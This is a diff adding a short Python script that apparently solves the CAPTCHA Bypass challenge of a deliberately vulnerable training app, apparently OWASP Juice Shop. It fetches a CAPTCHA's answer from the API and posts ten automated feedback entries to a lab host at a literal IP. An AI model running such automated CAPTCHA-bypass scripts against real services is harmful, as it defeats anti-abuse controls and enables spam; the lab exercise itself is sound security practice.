@@ -1,0 +1,24 @@
+import requests
+from tqdm import tqdm
+from tqdm import trange
+
+for i in trange(10):
+
+    # GET
+    url_get = 'http://13.125.207.167:3000/rest/captcha'
+    res = requests.get(url_get)
+    captcha = res.json()
+
+    # POST
+    url_post = 'http://13.125.207.167:3000/api/Feedbacks'
+    body = {
+        "UserId": 21,
+        "captchaId": captcha['captchaId'],
+        "captcha": captcha['answer'],
+        "comment": "CAPTCHA Bypass (***am620@gmail.com)",
+        "rating": 1
+    }
+
+    res = requests.post(url_post, body)
+
+print("Done")
